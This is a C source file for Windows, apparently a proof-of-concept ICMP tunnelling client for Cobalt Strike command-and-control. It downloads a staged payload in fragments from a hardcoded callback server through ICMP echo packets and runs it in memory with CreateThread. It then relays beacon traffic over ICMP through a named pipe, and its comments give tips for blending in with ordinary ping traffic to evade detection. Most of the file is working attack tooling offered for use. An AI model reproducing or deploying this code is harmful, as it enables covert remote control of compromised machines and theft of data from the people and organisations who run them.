#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

/*
POC: ICMP Send/Receive (Fixed)

This version ensures the client:
  1. Sends a “seq 0” Echo Request (Type 8) containing:
       [“RQ47”][4-byte big-endian total‐size]
  2. Blocks in recv_icmp_fragments(), which only processes:
       • Type = ICMP_ECHOREPLY (0)
       • ID = GetCurrentProcessId()
       • Payload starting with “RQ47”
     and reassembles chunks of size (ICMP_PAYLOAD_SIZE – TAG_SIZE) = 496 bytes.

To compile on Windows: link with ws2_32.lib
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

//Do not touch these. The server is currently setup to only look for 8 & 0 ICMP requests. This may change in the future
#define ICMP_ECHO       8
#define ICMP_ECHOREPLY  0

/*
Sleep in MS, for each ICMP message back.

NOTE - if you set this to something longer than a second, and have a small payload size, it will take a while
to download your enitre payload.

*/
#define SLEEP_TIME 1000 

// size of payload/data section of ICMP (excluding the 8-byte ICMP header)
#define ICMP_PAYLOAD_SIZE 1000  // in bytes, 
/*
adjust this to set the max payload size per icmp request.

If trying to blend in, use 32 on windows systems. (which is the default payload size of windows `ping` command).
Note, this will send a SHITLOAD more chunks/ICMP requests in general.

Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header

*/

//Do not touch these either, these are needed for chunk items & size calcs
#define IPV4_HEADER    20
#define ICMP_HEADER    8
#define TAG_SIZE       4
#define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)

//Callback server that the Controller is listenening on
#define ICMP_CALLBACK_SERVER "172.19.241.197"
//4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
#define ICMP_TAG             "RQ47"

//Cobalt Strike Settings - Don't touch
#define PAYLOAD_MAX_SIZE  (512 * 1024)
#define BUFFER_MAX_SIZE   (1024 * 1024)

struct icmp_header {
    BYTE  Type;
    BYTE  Code;
    USHORT Checksum;
    USHORT ID;
    USHORT Sequence;
};

// Compute Internet checksum over `size` bytes (in network‐order) at `buffer`
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

char* reassembly_buffer = NULL;
int expected_size = 0;
int received_chunks = 0;
int total_chunks = 0;
int received_map[1000]; // track received fragments (max 1000)

// Forward declarations
int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
char* recv_icmp_fragments(SOCKET s);
char* recv_icmp(SOCKET s);

// Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;

    // Read the 4‐byte length prefix
    if (!ReadFile(my_handle, (char*)&size, 4, &temp, NULL) || temp != 4) {
        return 0; // error or no data
    }

    // Ensure we don’t overflow the provided buffer
    if (size > max) {
        return 0;
    }

    // Read exactly `size` bytes into buffer
    while (total < size) {
        if (!ReadFile(my_handle, buffer + total, size - total, &temp, NULL)) {
            return 0;
        }
        total += temp;
    }

    return size;
}
// Writes a “frame” to the given HANDLE by first writing a 4‐byte length, then the data.
void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
    DWORD wrote = 0;

    // Write the 4‐byte length prefix
    WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);

    // Then write the actual `length` bytes
    WriteFile(my_handle, buffer, length, &wrote, NULL);
}



//
// send_icmp: send a single ICMP Echo Request (Type=8) with a custom sequence.
// Arguments:
//   s            = a raw socket (AF_INET, SOCK_RAW, IPPROTO_ICMP)
//   dest         = pointer to destination sockaddr_in
//   payload      = pointer to a buffer that already begins with TAG (4 bytes) followed by data
//   payload_len  = total length of `payload` (must be ≤ ICMP_PAYLOAD_SIZE)
//   seq_num      = sequence number to include (0 for “size” packet, 1..N for data chunks)
//
int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num) {
    char packet[MAX_PACKET_SIZE] = { 0 };
    struct icmp_header* icmp = (struct icmp_header*)packet;

    icmp->Type = ICMP_ECHO;                           // 8 = Echo Request
    icmp->Code = 0;
    icmp->ID = htons((USHORT)GetCurrentProcessId());
    icmp->Sequence = htons(seq_num);

    // Copy `payload_len` bytes of (TAG + data) right after the 8-byte ICMP header
    memcpy(packet + sizeof(struct icmp_header), payload, payload_len);

    icmp->Checksum = 0;
    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));

    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
    if (result == SOCKET_ERROR) {
        printf("[-] sendto failed: %d\n", WSAGetLastError());
        return -1;
    }
    printf("[+] Sent ICMP Echo Request: seq=%d, payload_len=%d\n", seq_num, payload_len);
    return 0;
}

//
// recv_icmp_fragments: block until all chunks (including seq 0) arrive as Echo Replies.
// Only processes packets satisfying:
//   - ICMP.Type    == ICMP_ECHOREPLY (0)
//   - ICMP.Code    == 0
//   - ICMP.ID      == GetCurrentProcessId()
//   - payload starts with “RQ47”
// Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
//
char* recv_icmp_fragments(SOCKET s) {
    char recvbuf[MAX_PACKET_SIZE];
    struct sockaddr_in from;
    int fromlen = sizeof(from);

    printf("[*] Waiting to receive seq 0 and subsequent chunks...\n");

    while (TRUE) {
        int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
        if (bytes == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                printf("[-] recvfrom timed out\n");
            }
            else {
                printf("[-] recvfrom failed: %d\n", err);
            }
            return NULL;
        }

        // Must be at least: IP header (20) + ICMP header (8) + TAG (4)
        if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
            continue;
        }

        struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
        char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);

        // ─── Discard anything that is not an Echo Reply ───
        if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
            continue;
        }

        // ─── Discard replies not matching our process ID ───
        USHORT resp_id = ntohs(icmp->ID);
        if (resp_id != (USHORT)GetCurrentProcessId()) {
            continue;
        }

        // ─── Discard if payload does not begin with TAG ───
        if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
            continue;
        }

        USHORT seq = ntohs(icmp->Sequence);
        printf("[+] Received Echo Reply: seq=%d, total_bytes=%d\n", seq, bytes);

        // Handle seq 0 — “size” packet
        if (seq == 0) {
            // Next 4 bytes after TAG is total payload size (big-endian)
            uint32_t netlen = 0;
            memcpy(&netlen, payload + TAG_SIZE, sizeof(netlen));
            expected_size = ntohl(netlen);
            printf("[+] Seq 0: expected_size = %d bytes\n", expected_size);

            // Allocate buffer for the entire incoming payload
            if (reassembly_buffer) {
                free(reassembly_buffer);
                reassembly_buffer = NULL;
            }
            reassembly_buffer = (char*)malloc(expected_size);
            if (!reassembly_buffer) {
                perror("malloc");
                return NULL;
            }

            // Initialize map/counters
            memset(received_map, 0, sizeof(received_map));
            received_chunks = 0;
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE; // 500 − 4 = 496
            total_chunks = (expected_size + data_per_chunk - 1) / data_per_chunk;
            printf("[+] Total chunks to receive: %d (data_per_chunk=%d)\n",
                total_chunks, data_per_chunk);
            continue;
        }

        // Handle seq > 0 — actual data fragments
        if (seq > 0 && seq <= total_chunks) {
            int chunk_index = seq - 1;
            if (received_map[chunk_index]) {
                printf("[*] Duplicate fragment seq=%d, skipping\n", seq);
                continue;
            }

            // Compute how many data bytes arrived (after IP+ICMP+TAG)
            int overhead = IPV4_HEADER + sizeof(struct icmp_header) + TAG_SIZE;
            int data_bytes = bytes - overhead;
            if (data_bytes < 0) data_bytes = 0;

            // Print chunk contents for debugging
            printf("[+] Chunk %d: data_bytes=%d\n", seq, data_bytes);
            //printf("    As text: \"%.*s\"\n", data_bytes, payload + TAG_SIZE);
            //printf("    Hex dump: ");
            //for (int i = 0; i < data_bytes; i++) {
            //    printf("%02x ", (unsigned char)(payload[TAG_SIZE + i]));
            //}
            //printf("\n");

            // Copy into reassembly_buffer at correct offset
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
            int chunk_offset = chunk_index * data_per_chunk;
            int copy_bytes = data_bytes;
            if (chunk_offset + copy_bytes > expected_size) {
                copy_bytes = expected_size - chunk_offset;
            }
            memcpy(reassembly_buffer + chunk_offset, payload + TAG_SIZE, copy_bytes);

            received_map[chunk_index] = 1;
            received_chunks++;
            printf("[+] Stored chunk %d/%d\n", received_chunks, total_chunks);

            if (received_chunks == total_chunks) {
                printf("[+] All fragments received!\n");
                return reassembly_buffer;
            }
        }
    }

    // Should not reach here
    return NULL;
}

//
// recv_icmp: simple wrapper to receive a single Echo Reply (Type 0) carrying a small payload.
// Returns a malloc’d buffer (null‐terminated) of payload bytes after the TAG.
//
char* recv_icmp(SOCKET s) {
    char recvbuf[MAX_PACKET_SIZE];
    struct sockaddr_in from;
    int fromlen = sizeof(from);

    printf("[*] Waiting for single ICMP Echo Reply...\n");
    int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
    if (bytes == SOCKET_ERROR) {
        printf("[-] recvfrom failed: %d\n", WSAGetLastError());
        return NULL;
    }

    if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
        return NULL;
    }

    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
    char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);

    // Must be an Echo Reply (Type 0) for our PID
    if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
        return NULL;
    }
    if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
        return NULL;
    }
    // Must begin with TAG
    if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
        return NULL;
    }

    // Copy whatever bytes follow the tag
    int payload_len = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
    if (payload_len <= 0) {
        return NULL;
    }
    char* out_data = (char*)malloc(payload_len + 1);
    if (!out_data) {
        perror("malloc");
        return NULL;
    }
    memcpy(out_data, payload + TAG_SIZE, payload_len);
    out_data[payload_len] = '\0';
    return out_data;
}

//
// bridge_to_beacon: high-level flow
//   1) Create raw ICMP socket
//   2) Build “seq 0” size packet: [TAG (4 bytes)] + [4-byte big-endian total-size]
//   3) send_icmp(..., seq=0)
//   4) call recv_icmp_fragments(), which returns the complete payload
//   5) Inject payload (as a new thread) and then relay any further traffic via named pipe
//
int bridge_to_beacon() {
    printf("[+] Creating raw socket...\n");
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        printf("[-] Error creating socket: %d\n", WSAGetLastError());
        return 1;
    }

    // Optional: set recv timeout so we don’t block forever
    int timeout_ms = 5000; // 5 seconds
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);

    // 1) Build “seq=0” size packet
    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
    uint32_t netlen = htonl(expected_server_payload);

    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
    // Copy “RQ47”
    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
    // Then 4-byte big-endian length
    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
    // Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
    int size_payload_len = TAG_SIZE + sizeof(netlen);

    // Send seq=0 Echo Request
    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
        printf("[-] Failed to send seq=0 packet\n");
        closesocket(s);
        return 1;
    }

    // 2) Wait for and reassemble all fragments (Echo Replies)
    char* full_payload = recv_icmp_fragments(s);
    if (!full_payload) {
        printf("[-] Failed to receive full payload\n");
        closesocket(s);
        return 1;
    }

    printf("[+] Received full payload: first 64 bytes as string:\n    %.64s\n", full_payload);

    printf("[+] Injecting payload into memory w/ CreateThread");
    // 3) Inject the payload into memory and start executing it
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)full_payload, NULL, 0, NULL);

    // 4) Bridge to beacon’s named pipe (\\.\pipe\foobar)
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        //Sleep(1000);
        handle_beacon = CreateFileA(
            "\\\\.\\pipe\\foobar",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
            NULL
        );
    }

    char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
    if (!pipe_buffer) {
        perror("malloc");
        closesocket(s);
        CloseHandle(handle_beacon);
        return 1;
    }

    while (TRUE) {
        // Read from beacon’s pipe
        DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
        if (beacon_output == 0 || beacon_output == (DWORD)-1) {
            break;
        }

        // Construct chunk payload: TAG + data
        int data_len = (int)beacon_output;
        if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
            data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
        }
        char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
        memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
        memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
        int chunk_payload_len = TAG_SIZE + data_len;

        // Send as an Echo Request with seq=1
        send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);

        // Wait for controller’s response (type 0)
        char* controller_resp = recv_icmp(s);
        if (controller_resp) {
            write_frame(handle_beacon, controller_resp, (DWORD)strlen(controller_resp));
            free(controller_resp);
        }

        Sleep(SLEEP_TIME);
    }

    // Cleanup
    free(pipe_buffer);
    CloseHandle(handle_beacon);
    closesocket(s);
    return 0;
}

void debug_constants() {
    printf("ICMP_ECHO: %d\n", ICMP_ECHO);
    printf("ICMP_ECHOREPLY: %d\n", ICMP_ECHOREPLY);
    printf("ICMP_PAYLOAD_SIZE: %d\n", ICMP_PAYLOAD_SIZE);
    printf("IPV4_HEADER: %d\n", IPV4_HEADER);
    printf("ICMP_HEADER: %d\n", ICMP_HEADER);
    printf("TAG_SIZE: %d\n", TAG_SIZE);
    printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
    printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
    printf("ICMP_TAG: %s\n", ICMP_TAG);
}

int main() {
    printf("[+] ICMP C2 Client Starting...\n");
    debug_constants();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return 1;
    }

    int result = bridge_to_beacon();
    WSACleanup();
    return result;
}
